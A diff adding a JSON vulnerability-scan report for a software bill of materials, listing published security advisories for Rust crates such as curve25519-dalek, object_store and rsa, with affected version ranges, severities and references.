@@ -1,0 +1,1912 @@
+{
+  "results": [
+    {
+      "source": {
+        "path": "/home/ooe/sbom_scanning/v2/data_1727870904/sbom_files/openobserve_openobserve_fa621e90b36accae2436aa9f79f7ff4fc972338b_9ibte8fp_infra.cdx.xml",
+        "type": "sbom"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "curve25519-dalek",
+            "version": "4.1.2",
+            "ecosystem": "crates.io"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-06-18T21:56:24Z",
+              "published": "2024-06-18T21:56:24Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-x4gp-pqpj-f43q",
+              "related": [
+                "CGA-3fjx-3p86-j2mq",
+                "CGA-pqf5-73f6-2j68",
+                "CGA-rrxp-vx65-hrrv"
+              ],
+              "summary": "curve25519-dalek has timing variability in `curve25519-dalek`'s `Scalar29::sub`/`Scalar52::sub`",
+              "details": "Timing variability of any kind is problematic when working with  potentially secret values such as\nelliptic curve scalars, and such issues can potentially leak private keys and other secrets. Such a\nproblem was recently discovered in `curve25519-dalek`.\n\nThe `Scalar29::sub` (32-bit) and `Scalar52::sub` (64-bit) functions contained usage of a mask value\ninside a loop where LLVM saw an opportunity to insert a branch instruction (`jns` on x86) to\nconditionally bypass this code section when the mask value is set to zero as can be seen in godbolt:\n\n- 32-bit (see L106): https://godbolt.org/z/zvaWxzvqv\n- 64-bit (see L48): https://godbolt.org/z/PczYj7Pda\n\nA similar problem was recently discovered in the Kyber reference implementation:\n\nhttps://groups.google.com/a/list.nist.gov/g/pqc-forum/c/hqbtIGFKIpU/m/cnE3pbueBgAJ\n\nAs discussed on that thread, one portable solution, which is also used in this PR, is to introduce a\nvolatile read as an optimization barrier, which prevents the compiler from optimizing it away.\n\nThe fix can be validated in godbolt here:\n\n- 32-bit: https://godbolt.org/z/jc9j7eb8E\n- 64-bit: https://godbolt.org/z/x8d46Yfah\n\nThe problem was discovered and the solution independently verified by \nAlexander Wagner \u003calexander.wagner@aisec.fraunhofer.de\u003e and Lea Themint \u003clea.thiemt@tum.de\u003e using\ntheir DATA tool:\n\nhttps://github.com/Fraunhofer-AISEC/DATA\n",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "curve25519-dalek",
+                    "purl": "pkg:cargo/curve25519-dalek"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.1.3"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-x4gp-pqpj-f43q/GHSA-x4gp-pqpj-f43q.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/dalek-cryptography/curve25519-dalek/pull/659"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/dalek-cryptography/curve25519-dalek/commit/415892acf1cdf9161bd6a4c99bc2f4cb8fae5e6a"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/dalek-cryptography/curve25519-dalek"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2024-0344.html"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-203"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-06-18T21:56:24Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              }
+            },
+            {
+              "modified": "2024-06-19T00:10:32Z",
+              "published": "2024-06-18T12:00:00Z",
+              "schema_version": "1.6.0",
+              "id": "RUSTSEC-2024-0344",
+              "summary": "Timing variability in `curve25519-dalek`'s `Scalar29::sub`/`Scalar52::sub`",
+              "details": "Timing variability of any kind is problematic when working with  potentially secret values such as\nelliptic curve scalars, and such issues can potentially leak private keys and other secrets. Such a\nproblem was recently discovered in `curve25519-dalek`.\n\nThe `Scalar29::sub` (32-bit) and `Scalar52::sub` (64-bit) functions contained usage of a mask value\ninside a loop where LLVM saw an opportunity to insert a branch instruction (`jns` on x86) to\nconditionally bypass this code section when the mask value is set to zero as can be seen in godbolt:\n\n- 32-bit (see L106): \u003chttps://godbolt.org/z/zvaWxzvqv\u003e\n- 64-bit (see L48): \u003chttps://godbolt.org/z/PczYj7Pda\u003e\n\nA similar problem was recently discovered in the Kyber reference implementation:\n\n\u003chttps://groups.google.com/a/list.nist.gov/g/pqc-forum/c/hqbtIGFKIpU/m/cnE3pbueBgAJ\u003e\n\nAs discussed on that thread, one portable solution, which is also used in this PR, is to introduce a\nvolatile read as an optimization barrier, which prevents the compiler from optimizing it away.\n\nThe fix can be validated in godbolt here:\n\n- 32-bit: \u003chttps://godbolt.org/z/jc9j7eb8E\u003e\n- 64-bit: \u003chttps://godbolt.org/z/x8d46Yfah\u003e\n\nThe problem was discovered and the solution independently verified by \nAlexander Wagner \u003calexander.wagner@aisec.fraunhofer.de\u003e and Lea Themint \u003clea.thiemt@tum.de\u003e using\ntheir DATA tool:\n\n\u003chttps://github.com/Fraunhofer-AISEC/DATA\u003e",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "curve25519-dalek",
+                    "purl": "pkg:cargo/curve25519-dalek"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.0.0-0"
+                        },
+                        {
+                          "fixed": "4.1.3"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "categories": [
+                      "crypto-failure"
+                    ],
+                    "cvss": null,
+                    "informational": null,
+                    "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2024-0344.json"
+                  },
+                  "ecosystem_specific": {
+                    "affected_functions": null,
+                    "affects": {
+                      "arch": [],
+                      "functions": [],
+                      "os": []
+                    }
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "PACKAGE",
+                  "url": "https://crates.io/crates/curve25519-dalek"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2024-0344.html"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/dalek-cryptography/curve25519-dalek/pull/659"
+                }
+              ],
+              "database_specific": {
+                "license": "CC0-1.0"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-x4gp-pqpj-f43q"
+              ],
+              "aliases": [
+                "GHSA-x4gp-pqpj-f43q"
+              ],
+              "max_severity": ""
+            },
+            {
+              "ids": [
+                "RUSTSEC-2024-0344"
+              ],
+              "aliases": [
+                "RUSTSEC-2024-0344"
+              ],
+              "max_severity": ""
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "lexical-core",
+            "version": "0.8.5",
+            "ecosystem": "crates.io"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-09-16T17:19:01Z",
+              "published": "2024-09-16T17:19:01Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-2326-pfpj-vx3h",
+              "related": [
+                "CGA-6vv6-vjgq-36r2",
+                "CGA-cxg6-prcx-jhq4"
+              ],
+              "summary": "lexical-core has multiple soundness issues",
+              "details": "`RUSTSEC-2024-0377` contains multiple soundness issues:\n\n 1. [Bytes::read() allows creating instances of types with invalid bit patterns](https://github.com/Alexhuszagh/rust-lexical/issues/102)\n 1. [BytesIter::read() advances iterators out of bounds](https://github.com/Alexhuszagh/rust-lexical/issues/101)\n 1. [The `BytesIter` trait has safety invariants but is public and not marked `unsafe`](https://github.com/Alexhuszagh/rust-lexical/issues/104)\n 1. [`write_float()` calls `MaybeUninit::assume_init()` on uninitialized data, which is is not allowed by the Rust abstract machine](https://github.com/Alexhuszagh/rust-lexical/issues/95)\n 1. [`radix()` calls `MaybeUninit::assume_init()` on uninitialized data, which is is not allowed by the Rust abstract machine](https://github.com/Alexhuszagh/rust-lexical/issues/126)\n\nVersion 1.0 fixes these issues, removes the vast majority of `unsafe` code, and also fixes some correctness issues.\n",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "lexical-core",
+                    "purl": "pkg:cargo/lexical-core"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.0.0"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-2326-pfpj-vx3h/GHSA-2326-pfpj-vx3h.json"
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Alexhuszagh/rust-lexical/issues/101"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Alexhuszagh/rust-lexical/issues/102"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Alexhuszagh/rust-lexical/issues/104"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Alexhuszagh/rust-lexical/issues/126"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Alexhuszagh/rust-lexical/issues/95"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/Alexhuszagh/rust-lexical"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/advisories/GHSA-c2hm-mjxv-89r4"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2023-0055"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2023-0086.html"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-09-16T17:19:01Z",
+                "nvd_published_at": null,
+                "severity": "LOW"
+              }
+            },
+            {
+              "modified": "2024-09-16T14:16:22Z",
+              "published": "2023-09-03T12:00:00Z",
+              "schema_version": "1.6.0",
+              "id": "RUSTSEC-2023-0086",
+              "related": [
+                "RUSTSEC-2023-0055"
+              ],
+              "summary": "Multiple soundness issues",
+              "details": "`RUSTSEC-2024-0377` contains multiple soundness issues:\n\n 1. [Bytes::read() allows creating instances of types with invalid bit patterns](https://github.com/Alexhuszagh/rust-lexical/issues/102)\n 1. [BytesIter::read() advances iterators out of bounds](https://github.com/Alexhuszagh/rust-lexical/issues/101)\n 1. [The `BytesIter` trait has safety invariants but is public and not marked `unsafe`](https://github.com/Alexhuszagh/rust-lexical/issues/104)\n 1. [`write_float()` calls `MaybeUninit::assume_init()` on uninitialized data, which is is not allowed by the Rust abstract machine](https://github.com/Alexhuszagh/rust-lexical/issues/95)\n 1. [`radix()` calls `MaybeUninit::assume_init()` on uninitialized data, which is is not allowed by the Rust abstract machine](https://github.com/Alexhuszagh/rust-lexical/issues/126)\n\nVersion 1.0 fixes these issues, removes the vast majority of `unsafe` code, and also fixes some correctness issues.",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "lexical-core",
+                    "purl": "pkg:cargo/lexical-core"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.0.0-0"
+                        },
+                        {
+                          "fixed": "1.0.0"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "categories": [],
+                    "cvss": null,
+                    "informational": "unsound",
+                    "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2023-0086.json"
+                  },
+                  "ecosystem_specific": {
+                    "affected_functions": null,
+                    "affects": {
+                      "arch": [],
+                      "functions": [],
+                      "os": []
+                    }
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "PACKAGE",
+                  "url": "https://crates.io/crates/lexical-core"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2023-0086.html"
+                },
+                {
+                  "type": "REPORT",
+                  "url": "https://github.com/Alexhuszagh/rust-lexical/issues/102"
+                },
+                {
+                  "type": "REPORT",
+                  "url": "https://github.com/Alexhuszagh/rust-lexical/issues/101"
+                },
+                {
+                  "type": "REPORT",
+                  "url": "https://github.com/Alexhuszagh/rust-lexical/issues/95"
+                },
+                {
+                  "type": "REPORT",
+                  "url": "https://github.com/Alexhuszagh/rust-lexical/issues/104"
+                },
+                {
+                  "type": "REPORT",
+                  "url": "https://github.com/Alexhuszagh/rust-lexical/issues/126"
+                }
+              ],
+              "database_specific": {
+                "license": "CC0-1.0"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-2326-pfpj-vx3h"
+              ],
+              "aliases": [
+                "GHSA-2326-pfpj-vx3h"
+              ],
+              "max_severity": ""
+            },
+            {
+              "ids": [
+                "RUSTSEC-2023-0086"
+              ],
+              "aliases": [
+                "RUSTSEC-2023-0086"
+              ],
+              "max_severity": ""
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "mach",
+            "version": "0.3.2",
+            "ecosystem": "crates.io"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2023-03-12T06:59:25Z",
+              "published": "2020-07-14T12:00:00Z",
+              "schema_version": "1.6.0",
+              "id": "RUSTSEC-2020-0168",
+              "summary": "mach is unmaintained",
+              "details": "Last release was almost 4 years ago.\n\nMaintainer(s) seem to be completely unreachable. \n\n## Possible Alternative(s)\n\nThese may or may not be suitable alternatives and have not been vetted in any way;\n- [mach2](https://crates.io/crates/mach2) - direct fork",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "mach",
+                    "purl": "pkg:cargo/mach"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.0.0-0"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "categories": [],
+                    "cvss": null,
+                    "informational": "unmaintained",
+                    "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2020-0168.json"
+                  },
+                  "ecosystem_specific": {
+                    "affected_functions": null,
+                    "affects": {
+                      "arch": [],
+                      "functions": [],
+                      "os": []
+                    }
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "PACKAGE",
+                  "url": "https://crates.io/crates/mach"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2020-0168.html"
+                },
+                {
+                  "type": "REPORT",
+                  "url": "https://github.com/fitzgen/mach/issues/63"
+                }
+              ],
+              "database_specific": {
+                "license": "CC0-1.0"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "RUSTSEC-2020-0168"
+              ],
+              "aliases": [
+                "RUSTSEC-2020-0168"
+              ],
+              "max_severity": ""
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "object_store",
+            "version": "0.9.1",
+            "ecosystem": "crates.io"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-07-24T15:28:55Z",
+              "published": "2024-07-23T18:31:07Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-c2hf-vcmr-qjrf",
+              "aliases": [
+                "CVE-2024-41178",
+                "RUSTSEC-2024-0358"
+              ],
+              "related": [
+                "CGA-459m-ww6x-8hw2",
+                "CGA-fvv9-9gwx-2fj7"
+              ],
+              "summary": "Apache Arrow Rust Object Store: AWS WebIdentityToken exposure in log files",
+              "details": "Exposure of temporary credentials in logs in Apache Arrow Rust Object Store (`object_store` crate), version 0.10.1 and earlier on all platforms using AWS WebIdentityTokens. \n\nOn certain error conditions, the logs may contain the OIDC token passed to  AssumeRoleWithWebIdentity https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithWebIdentity.html . This allows someone with access to the logs to impersonate that identity, including performing their own calls to AssumeRoleWithWebIdentity, until the OIDC token expires. Typically OIDC tokens are valid for up to an hour, although this will vary depending on the issuer.\n\nUsers are recommended to use a different AWS authentication mechanism, disable logging or upgrade to version 0.10.2, which fixes this issue.\n\nDetails:\n\nWhen using AWS WebIdentityTokens with the object_store crate, in the event of a failure and automatic retry, the underlying reqwest error, including the full URL with the credentials, potentially in the parameters, is written to the logs. \n\nThanks to Paul Hatcherian for reporting this vulnerability",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "object_store",
+                    "purl": "pkg:cargo/object_store"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.5.0"
+                        },
+                        {
+                          "fixed": "0.10.2"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/07/GHSA-c2hf-vcmr-qjrf/GHSA-c2hf-vcmr-qjrf.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N"
+                },
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:L/SI:L/SA:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-41178"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/apache/arrow-rs/pull/6074"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/apache/arrow-rs/commit/4978e32654235f569062f2cad6c7361e410f1254"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/apache/arrow-rs"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.apache.org/thread/3t0povdppnt2czv6crlsqhvyko93kcrg"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2024-0358.html"
+                },
+                {
+                  "type": "WEB",
+                  "url": "http://www.openwall.com/lists/oss-security/2024/07/23/3"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-532"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-07-24T14:59:02Z",
+                "nvd_published_at": "2024-07-23T17:15:12Z",
+                "severity": "MODERATE"
+              }
+            },
+            {
+              "modified": "2024-07-24T15:28:55Z",
+              "published": "2024-07-23T12:00:00Z",
+              "schema_version": "1.6.0",
+              "id": "RUSTSEC-2024-0358",
+              "aliases": [
+                "CVE-2024-41178",
+                "GHSA-c2hf-vcmr-qjrf"
+              ],
+              "summary": "Apache Arrow Rust Object Store: AWS WebIdentityToken exposure in log files",
+              "details": "Exposure of temporary credentials in logs in Apache Arrow Rust Object Store,\nversion 0.10.1 and earlier on all platforms using AWS WebIdentityTokens.\n\nOn certain error conditions, the logs may contain the OIDC token passed to\n[AssumeRoleWithWebIdentity](https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithWebIdentity.html).\nThis allows someone with access to the logs to impersonate that identity,\nincluding performing their own calls to AssumeRoleWithWebIdentity, until the\nOIDC token expires. Typically OIDC tokens are valid for up to an hour, although\nthis will vary depending on the issuer.\n\nUsers are recommended to use a different AWS authentication mechanism, disable\nlogging or upgrade to version 0.10.2, which fixes this issue.\n\n## Details\n\nWhen using AWS WebIdentityTokens with the `object_store` crate, in the event of\na failure and automatic retry, the underlying `reqwest` error, including the\nfull URL with the credentials, potentially in the parameters, is written to the\nlogs.\n\nThanks to Paul Hatcherian for reporting this vulnerability",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "object_store",
+                    "purl": "pkg:cargo/object_store"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.5.0"
+                        },
+                        {
+                          "fixed": "0.10.2"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "categories": [],
+                    "cvss": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N",
+                    "informational": null,
+                    "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2024-0358.json"
+                  },
+                  "ecosystem_specific": {
+                    "affected_functions": null,
+                    "affects": {
+                      "arch": [],
+                      "functions": [],
+                      "os": []
+                    }
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "PACKAGE",
+                  "url": "https://crates.io/crates/object_store"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2024-0358.html"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/apache/arrow-rs/pull/6074"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://www.openwall.com/lists/oss-security/2024/07/23/3"
+                }
+              ],
+              "database_specific": {
+                "license": "CC0-1.0"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-c2hf-vcmr-qjrf",
+                "RUSTSEC-2024-0358"
+              ],
+              "aliases": [
+                "CVE-2024-41178",
+                "GHSA-c2hf-vcmr-qjrf",
+                "RUSTSEC-2024-0358"
+              ],
+              "max_severity": "4.8"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "proc-macro-error",
+            "version": "1.0.4",
+            "ecosystem": "crates.io"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-09-09T12:08:37Z",
+              "published": "2024-09-01T12:00:00Z",
+              "schema_version": "1.6.0",
+              "id": "RUSTSEC-2024-0370",
+              "summary": "proc-macro-error is unmaintained",
+              "details": "proc-macro-error's maintainer seems to be unreachable, with no commits for 2 years, no releases pushed for 4 years, and no activity on the GitLab repo or response to email.\n\nproc-macro-error also depends on `syn 1.x`, which may be bringing duplicate dependencies into dependant build trees.\n\n## Possible Alternative(s)\n\n- [manyhow](https://crates.io/crates/manyhow)\n- [proc-macro-error2](https://crates.io/crates/proc-macro-error2)\n- [proc-macro2-diagnostics](https://github.com/SergioBenitez/proc-macro2-diagnostics)",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "proc-macro-error",
+                    "purl": "pkg:cargo/proc-macro-error"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.0.0-0"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "categories": [],
+                    "cvss": null,
+                    "informational": "unmaintained",
+                    "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2024-0370.json"
+                  },
+                  "ecosystem_specific": {
+                    "affected_functions": null,
+                    "affects": {
+                      "arch": [],
+                      "functions": [],
+                      "os": []
+                    }
+                  }
+                }
+              ],
+              "references": [
+                {
+                  "type": "PACKAGE",
+                  "url": "https://crates.io/crates/proc-macro-error"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2024-0370.html"
+                },
+                {
+                  "type": "REPORT",
+                  "url": "https://gitlab.com/CreepySkeleton/proc-macro-error/-/issues/20"
+                }
+              ],
+              "database_specific": {
+                "license": "CC0-1.0"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "RUSTSEC-2024-0370"
+              ],
+              "aliases": [
+                "RUSTSEC-2024-0370"
+              ],
+              "max_severity": ""
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "rsa",
+            "version": "0.9.6",
+            "ecosystem": "crates.io"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2023-12-15T15:11:24Z",
+              "published": "2023-11-28T23:28:25Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-4grx-2x9w-596c",
+              "aliases": [
+                "CVE-2023-49092",
+                "GHSA-c38w-74pg-36hr",
+                "RUSTSEC-2023-0071"
+              ],
+              "summary": "Marvin Attack: potential key recovery through timing sidechannels",
+              "details": "The [Marvin Attack] is a timing sidechannel vulnerability which allows performing RSA decryption and signing operations as an attacker with the ability to observe only the time of the decryption operation performed withthe private key.\n\nA recent survey of RSA implementations found that the Rust `rsa` crate is one of many implementations vulnerable to this attack.\n\nNo fixed version is available at this time.\n\n[Marvin Attack]: https://people.redhat.com/~hkario/marvin/",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rsa",
+                    "purl": "pkg:cargo/rsa"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "last_affected": "0.9.6"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/11/GHSA-4grx-2x9w-596c/GHSA-4grx-2x9w-596c.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/RustCrypto/RSA/security/advisories/GHSA-c38w-74pg-36hr"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/RustCrypto/RSA/issues/19#issuecomment-1822995643"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/RustCrypto/RSA"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2023-0071.html"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-385"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2023-11-28T23:28:25Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              }
+            },
+            {
+              "modified": "2023-12-15T15:11:24Z",
+              "published": "2023-11-28T23:28:27Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-c38w-74pg-36hr",
+              "aliases": [
+                "CVE-2023-49092",
+                "GHSA-4grx-2x9w-596c",
+                "RUSTSEC-2023-0071"
+              ],
+              "summary": "Marvin Attack: potential key recovery through timing sidechannels",
+              "details": "### Impact\nDue to a non-constant-time implementation, information about the private key is leaked through timing information which is observable over the network. An attacker may be able to use that information to recover the key.\n\n### Patches\nNo patch is yet available, however work is underway to migrate to a fully constant-time implementation.\n\n### Workarounds\nThe only currently available workaround is to avoid using the `rsa` crate in settings where attackers are able to observe timing information, e.g. local use on a non-compromised computer is fine.\n\n### References\nThis vulnerability was discovered as part of the \"Marvin Attack\", which revealed several implementations of RSA including OpenSSL had not properly mitigated timing sidechannel attacks.\n\n- https://rustsec.org/advisories/RUSTSEC-2023-0071.html\n- https://people.redhat.com/~hkario/marvin/\n- https://github.com/RustCrypto/RSA/issues/19",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rsa",
+                    "purl": "pkg:cargo/rsa"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "last_affected": "0.9.6"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/11/GHSA-c38w-74pg-36hr/GHSA-c38w-74pg-36hr.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/RustCrypto/RSA/security/advisories/GHSA-c38w-74pg-36hr"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-49092"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/RustCrypto/RSA/issues/19#issuecomment-1822995643"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/RustCrypto/RSA"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://rustsec.org/advisories/RUSTSEC-2023-0071.html"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-203",
+                  "CWE-385"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2023-11-28T23:28:27Z",
+                "nvd_published_at": "2023-11-28T21:15:08Z",
+                "severity": "MODERATE"
+              }
+            },
+            {
+              "modified": "2023-12-15T15:11:24Z",
+              "published": "2023-11-22T12:00:00Z",
+              "schema_version": "1.6.0",
+              "id": "RUSTSEC-2023-0071",
+              "aliases": [
+                "CVE-2023-49092",
+                "GHSA-4grx-2x9w-596c",
+                "GHSA-c38w-74pg-36hr"
+              ],
+              "summary": "Marvin Attack: potential key recovery through timing sidechannels",
+              "details": "### Impact\nDue to a non-constant-time implementation, information about the private key is leaked through timing information which is observable over the network. An attacker may be able to use that information to recover the key.\n\n### Patches\nNo patch is yet available, however work is underway to migrate to a fully constant-time implementation.\n\n### Workarounds\nThe only currently available workaround is to avoid using the `rsa` crate in settings where attackers are able to observe timing information, e.g. local use on a non-compromised computer is fine.\n\n### References\nThis vulnerability was discovered as part of the \"[Marvin Attack]\", which revealed several implementations of RSA including OpenSSL had not properly mitigated timing sidechannel attacks.\n\n[Marvin Attack]: https://people.redhat.com/~hkario/marvin/",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "rsa",
+                    "purl": "pkg:cargo/rsa"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0.0.0-0"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "categories": [
+                      "crypto-failure"
+                    ],
